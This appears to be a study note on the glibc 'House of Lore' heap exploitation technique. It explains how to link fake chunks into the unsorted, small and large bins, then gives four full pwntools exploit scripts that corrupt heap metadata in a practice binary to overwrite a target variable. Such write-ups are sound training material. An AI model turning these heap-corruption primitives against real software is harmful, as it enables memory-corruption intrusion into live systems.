---
title: 'House of Lore'
disqus: hackmd
---
 
# Overall 
![image](https://hackmd.io/_uploads/SyBPO_KBA.png)


- ***Linking a fake chunk into an unsortedbin*** is equivalent to aiming an ***unsortedbin attack*** at a fake chunk by ***overwriting the unsorted chunk’s bk with the address of the fake chunk***. 
    - **The fake chunk must have a bk which points to a writable address**. 
    - The fake chunk can be allocated directly from the unsortedbin, although its size field must match the request size and differ from the chunk with the corrupt bk. 
- ***Linking a fake chunk into a smallbin*** requires **overwriting the bk of a chunk linked into a smallbin with the address of the fake chunk**  
    - We must ***ensure the victim->bk->fd == victim check passes by writing the address of the victim small chunk into the fake chunk’s fd pointer before the small chunk is allocated***. 
    - Once the small chunk is allocated, the ***fake chunk must pass the victim->bk->fd == victim*** check too, this can be achieved by **pointing both its fd & bk at itself**(not in this challenge). 
    - **In scenarios where the fake chunk cannot be changed after the victim small chunk is allocated**, it’s possible to **use a 2nd fake chunk**, although only 1 quadword is required to hold a fake fd. 
        - ***Pointing this 2nd fake chunk’s fd at the primary fake chunk***, and the primary fake chunk’s bk at the 2nd fake chunk will satisfy the check. The size of the fake chunk is irrelevant as it is not checked. 
- ***The easiest way to link a fake chunk into a largebin*** involves ***overwriting a skip chunk’s fd with the address of a fake chunk and preparing the fake chunk’s fd & bk to satisfy the safe unlinking checks.*** 
    - ***Malloc will not check the skip chunk’s fd for a viable chunk if the skip chunk is the last in the bin.***
        - **The fake chunk must have the same size field as the skip chunk.** 
        - **The skip chunk must have another same-sized or smaller chunk in the same bin**. 
    - The fake chunk’s fd & bk can be prepared to satisfy the safe unlinking checks by pointing them both at the fake chunk.
 
 
 # Approach
- Link a fake chunk into the unsortedbin, smallbins or largebins by tampering with inline malloc metadata. 
 
 # Further use


- The first is that much like allocating fake chunks from the fastbins, I can misalign my fake chunk. If I'm trying to find a naturally occurring size field, I can also use invalid flag combinations, including a set forth-least significant bit.
- The second thing is that because I control the fake chunk's bk I can potentially point it at another fake chunk, then allocate that.
 
 # Limitations

- The amount and precise location of controlled memory ***required to construct fake small and large chunks for the*** House of Lore can make it difficult to implement against these bins. 
-  It requires you must explore ***UAF(write-after-free)***.

 # Note
 The fake chunk must satisfy 2 constraints
 - The first is that its size field has to pass the unsortedbin size sanity check, meaning it should take a value between the minimum valid chunk size and the total amount of memory the current thread's arena has checked out from the kernel, a value held in the arena's "system_mem" field.
 - The second constraint is that the fake chunk's backward pointer must hold the address of writable memory since it will be referenced and used in a write operation during the partial unlink.

 # Script
 
unsortedbin.py

 
```python=
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_lore', checksec=False)

#libc = ELF('../.glibc/glibc_2.25/libc.so.6', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+290

b *main+390
b *main+521

b *main+748
b *main+849

b *main+945
b *main+1064
"""

index = 0

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)

def handle():
    io.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    success("puts leak")
    info('puts @ ' + hex(puts))
    success("heap leak")
    info('heap @ ' + hex(heap))
    return puts, heap

def send_name(name):
    io.sendafter(b'Enter your username: ', name)
    io.recvuntil(b'> ')

def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    

def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def edit(index, data):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')

def target():
    io.send(b'4')
    io.recvuntil(b'> ')

def quit():
    io.send(b'5')
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

io = start()
puts, heap = handle()

name = p64(0) + p64(0xa1) + p64(0) + p64(elf.sym['user'] - 0x10)
send_name(name)

chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

free(chunk_A)
edit(chunk_A, p64(0) + p64(elf.sym['user']))


#one way
'''
chunk_A2 = malloc(0x88)
fake_chunk = malloc(0x98)
'''

fake_chunk = malloc(0x98)

edit(fake_chunk, p64(0)*4 + b'Much win\x00')
target()

io.interactive()
 ```
 
 

---
smallbin.py

```python=
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_lore', checksec=False)

#libc = ELF('../.glibc/glibc_2.25/libc.so.6', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+290

b *main+390
b *main+521

b *main+748
b *main+849

b *main+945
b *main+1064
"""

index = 0

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)

def handle():
    io.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    success("puts leak")
    info('puts @ ' + hex(puts))
    success("heap leak")
    info('heap @ ' + hex(heap))
    return puts, heap

def send_name(name):
    io.sendafter(b'Enter your username: ', name)
    io.recvuntil(b'> ')

def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    

def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def edit(index, data):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')

def target():
    io.send(b'4')
    io.recvuntil(b'> ')

def quit():
    io.send(b'5')
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

io = start()
puts, heap = handle()
#smallbin doesn't check valid chunk size
name = p64(elf.sym['user']) + p64(0) + p64(heap) + p64(elf.sym['user'] - 0x10)
send_name(name)

chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

free(chunk_A)

malloc(0xa8)

edit(chunk_A, p64(0) + p64(elf.sym['user']))

chunk_A2 = malloc(0x88)
fake_chunk = malloc(0x88)

edit(fake_chunk, p64(0)*4 + b'Much win\x00')
target()
quit()


io.interactive()

```

---
largerbinfd.py

```python=

#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_lore', checksec=False)

#libc = ELF('../.glibc/glibc_2.25/libc.so.6', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+290

b *main+390
b *main+521

b *main+748
b *main+849

b *main+945
b *main+1064
"""

index = 0

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)

def handle():
    io.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    success("puts leak")
    info('puts @ ' + hex(puts))
    success("heap leak")
    info('heap @ ' + hex(heap))
    return puts, heap

def send_name(name):
    io.sendafter(b'Enter your username: ', name)
    io.recvuntil(b'> ')

def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    

def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def edit(index, data):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')

def target():
    io.send(b'4')
    io.recvuntil(b'> ')

def quit():
    io.send(b'5')
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

io = start()
puts, heap = handle()

# target fd 
name = p64(0) + p64(0x401) + p64(elf.sym['user']) + p64(elf.sym['user'])
send_name(name)

chunk_A = malloc(0x3f8)
malloc(0x88)
chunk_B = malloc(0x3f8)
malloc(0x88)

free(chunk_A)
free(chunk_B)

malloc(0x408)

edit(chunk_A, p64(elf.sym['user']))

fake_chunk = malloc(0x3f8)

edit(fake_chunk, p64(0)*4 + b'Much win\x00')
target()
quit()

io.interactive()

```

---
largebinbknextsize.py

```python=
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_lore', checksec=False)

#libc = ELF('../.glibc/glibc_2.25/libc.so.6', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+290

b *main+390
b *main+521

b *main+748
b *main+849

b *main+945
b *main+1064
"""

index = 0

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)

def handle():
    io.recvuntil(b'puts() @ ')
    puts = int(io.recvline(), 16)
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    success("puts leak")
    info('puts @ ' + hex(puts))
    success("heap leak")
    info('heap @ ' + hex(heap))
    return puts, heap

def send_name(name):
    io.sendafter(b'Enter your username: ', name)
    io.recvuntil(b'> ')

def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    

def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def edit(index, data):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')

def target():
    io.send(b'4')
    io.recvuntil(b'> ')

def quit():
    io.send(b'5')
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

io = start()
puts, heap = handle()
#smallbin doesn't check valid chunk size


# target bk nextsize
name = p64(0) + p64(0x501) + p64(elf.sym['user']) + p64(elf.sym['user'])
send_name(name)

chunk_A = malloc(0x3f8)
malloc(0x88)

free(chunk_A)

malloc(0x408)

edit(chunk_A, p64(0)*3 + p64(elf.sym['user']))

fake_chunk = malloc(0x3f8)

edit(fake_chunk, p64(0)*4 + b'Much win\x00')
target()
quit()

io.interactive()
```

---
